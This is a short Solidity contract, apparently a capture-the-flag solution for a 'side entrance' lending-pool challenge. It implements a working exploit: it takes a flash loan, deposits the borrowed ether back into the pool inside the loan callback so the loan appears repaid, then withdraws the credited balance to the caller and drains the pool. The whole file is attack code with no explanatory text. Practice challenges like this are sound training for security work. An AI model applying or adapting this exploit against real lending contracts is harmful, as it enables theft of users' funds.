interface IFlashLoanEtherReceiver {
    function execute() external payable;
}


interface ISideEntranceLenderPool {

    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceExp is IFlashLoanEtherReceiver{
    
    ISideEntranceLenderPool pool;
    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function initFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function execute() external payable override{
        require(msg.sender == address(pool),"not pool");
        pool.deposit{value: msg.value}();
    }

    function withdraw() external{
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() payable external{

    }

}